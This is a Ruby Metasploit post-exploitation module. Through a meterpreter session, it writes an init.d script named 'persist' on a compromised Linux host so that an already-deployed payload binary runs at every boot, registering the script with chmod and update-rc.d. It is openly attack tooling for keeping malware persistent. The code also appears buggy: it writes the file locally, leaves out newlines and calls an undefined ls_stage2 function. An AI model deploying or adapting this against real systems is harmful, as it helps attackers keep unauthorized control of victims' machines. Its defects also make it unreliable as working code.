##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


##
# Exploit Title  : Kali_initd_persistence.rb
# Module Author  : pedr0 Ubuntu [r00t-3xp10it]
# Tested on      : Linux Kali 2.0
#
#
# [ DESCRIPTION ]
# Builds 'persist' init.d startup script that allow users to persiste
# your elf binary (linux executable) on Linux Kali distros at every startup
# This post-exploitation module requires the payload allready deployed
# in target system and root privileges (in non-Kali distros).
#
#
# [ MODULE OPTIONS ]
# The session number to run this module on        => set SESSION 3
# The full path of binay to be executed (remote)  => set REMOTE_PATH /root/payload
# The full path to init.d directory     (remote)  => set INIT_PATH /etc/init.d
# Delete persistence script/configurations        => set DEL_PERSISTENCE true
#
#
# [ PORT MODULE TO METASPLOIT DATABASE ]
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/linux/manage/kali_initd_persistence.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/linux/manage/kali_initd_persistence.rb
# Manually Path Search: root@kali:~# locate modules/post/linux/manage
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > reload_all
# msf exploit(handler) > use post/linux/manage/kali_initd_persistence
# msf post(kali_initd_persistence) > info
# msf post(kali_initd_persistence) > show options
# msf post(kali_initd_persistence) > show advanced options
# msf post(kali_initd_persistence) > set [option(s)]
# msf post(kali_initd_persistence) > exploit
#
#
# [ HINT ]
# In some linux distributions postgresql needs to be started and
# metasploit database deleted/rebuild to be abble to load module.
# 1 - service postgresql start
# 2 - msfdb reinit   (optional)
# 3 - msfconsole -x 'reload_all'
##




# ----------------------------
# Module Dependencies/requires
# ----------------------------
require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/linux/priv'




# ----------------------------------
# Metasploit Class name and includes
# ----------------------------------
class MetasploitModule < Msf::Post
      Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Exploit::FILEFORMAT



# -----------------------------------------
# Building Metasploit/Armitage info GUI/CLI
# -----------------------------------------
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'Kali binary[elf] init.d persistence module',
                        'Description'   => %q{
                                        Builds 'persist' init.d startup script that allow users to persiste your elf binary (linux executable) on Linux Kali distros at every startup. This post-exploitation module requires the payload allready deployed in target system and root privileges (in non-Kali distros).
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                ],
 
                        'Version'        => '$Revision: 1.0',
                        'DisclosureDate' => 'mai 30 2017',
                        'Platform'       => 'linux',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'false',   # thats no need for privilege escalation..
                        'Targets'        =>
                                [
                                         # Tested againts windows 7 | Windows 10
                                         [ 'Linux Kali' ]
                                ],
                        'DefaultTarget'  => '1', # default its to run againts Kali 2.0
                        'References'     =>
                                [
                                         [ 'URL', 'POC: goo.gl/XHQ6aF' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it' ],
                                         [ 'URL', 'http://x42.obscurechannel.com/?p=368' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ]


                                ],
			'DefaultOptions' =>
				{
                                         'SESSION' => '1',             # Default its to run againts session 1
                                         'INIT_PATH' => '/etc/init.d', # Default init.d directory full path
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptString.new('REMOTE_PATH', [ false, 'The full path of binay to be executed (eg /root/payload)'])
                        ], self.class)

                register_advanced_options(
                        [
                                OptString.new('INIT_PATH', [ false, 'The full path to init.d directory (eg /etc/init.d)']),
                                OptBool.new('DEL_PERSISTENCE', [ false, 'Delete persistence script/configurations?' , false])
                        ], self.class) 

        end



#
# Build remote init.d persistence script ..
#
def ls_stage1

  file_temp=''
  session = client
  init_check = datastore['INIT_PATH']    # /etc/init.d
  remote_path = datastore['REMOTE_PATH'] # /root/payload
  script_check = "#{init_check}/persist" # /etc/init.d/persist
  #
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options ..
  #
  if datastore['REMOTE_PATH'] == 'nil'
    vprint_error("Options not configurated correctly ..")
    vprint_warning("Please set REMOTE_PATH options!")
    return nil
  else
    vprint_status("Persisting: #{remote_path} agent ..")
    Rex::sleep(1.0)
  end

    #
    # Check if agent its deployed in target system ..
    #
    if not session.fs.file.exist?(remote_path)
      vprint_error("%red" + "agent: #{remote_path} not found ..")
      return nil
    end
    #
    # Check init.d directory existance ..
    #
    if not session.fs.directory.exist?(init_check)
      vprint_error("%red" + "path: #{init_check} not found ..")
      return nil
    end

      #
      # This is the init.d script that provides persistence on startup ..
      #
      vprint_warning("writing init.d startup script ..")
      Rex::sleep(1.0)
      vprint_good("remote path: #{init_check}/persist")
      File.open("#{init_check}/persist", "w+") do |f|
        f.write("#!/bin/sh")
        f.write("### BEGIN INIT INFO")
        f.write("# Provides:          persistence on kali")
        f.write("# Required-Start:    $network $local_fs $remote_fs")
        f.write("# Required-Stop:     $remote_fs $local_fs")
        f.write("# Default-Start:     2 3 4 5")
        f.write("# Default-Stop:      0 1 6")
        f.write("# Short-Description: Persiste your binary (elf) in kali linux.")
        f.write("# Description:       Allows users to persiste your binary (elf) in kali linux systems")
        f.write("### END INIT INFO")
        f.write("#")
        f.write("# Give a little time to execute elf agent")
        f.write("sleep 5 > /dev/null")
        f.write("./#{remote_path}")
      end
      #
      # Config init.d startup service (chmod + update-rc.d)
      #
      if session.fs.file.exist?(script_check)
        vprint_status("Config init.d persistence script ..")
        Rex::sleep(1.0)
        cmd_exec("chmod +x #{script_check}")
        vprint_status("Update init.d service status ..")
        Rex::sleep(1.0)
        cmd_exec("update-rc.d persist defaults # 97 03")
      else
        vprint_error("%red" + "init.d script: #{script_check} not found ..")
        return nil
      end

    #
    # Final displays to user ..
    #
    vprint_status("persistence activated on remote system ..")
    vprint_status("agent to exec: #{remote_path}")
    vprint_status("init.d script: #{script_check}")
    vprint_line("")
    Rex::sleep(1.0)

  #
  # error exception funtion
  #
  rescue ::Exception => e
  vprint_error("Error: #{e.class} #{e}")
end










# ------------------------------------------------
# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
# Running sellected modules against session target
# ------------------------------------------------
def run
  session = client

      # Variable declarations (msf API calls)
      sysnfo = session.sys.config.sysinfo
      runtor = client.sys.config.getuid
      runsession = client.session_host
      directory = client.fs.dir.pwd


    # Print banner and scan results on screen
    print_line("    +---------------------------------------------+")
    print_line("    |  Kali Linux init.d persistence post-module  |")
    print_line("    |            Author : r00t-3xp10it            |")
    print_line("    +---------------------------------------------+")
    print_line("")
    print_line("    Running on session  : #{datastore['SESSION']}")
    print_line("    Computer            : #{sysnfo['Computer']}")
    print_line("    Operative System    : #{sysnfo['OS']}")
    print_line("    Target IP addr      : #{runsession}")
    print_line("    Payload directory   : #{directory}")
    print_line("    Client UID          : #{runtor}")
    print_line("")
    print_line("")


    #
    # the 'def check()' funtion that rapid7 requires to accept new modules.
    # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
    #
    # check for proper session (meterpreter)
    # the non-return of sysinfo command reveals
    # that we are not on a meterpreter session!
    if not sysinfo.nil?
      print_status("Running module against: #{sysnfo['Computer']}")
    else
      print_error("[ ABORT ]: This module only works against meterpreter sessions!")
      return nil
    end


# ------------------------------------
# Selected settings to run
# ------------------------------------
      if datastore['REMOTE_PATH']
         ls_stage1
      end

      if datastore['DEL_PERSISTENCE']
         ls_stage2
      end
   end
end
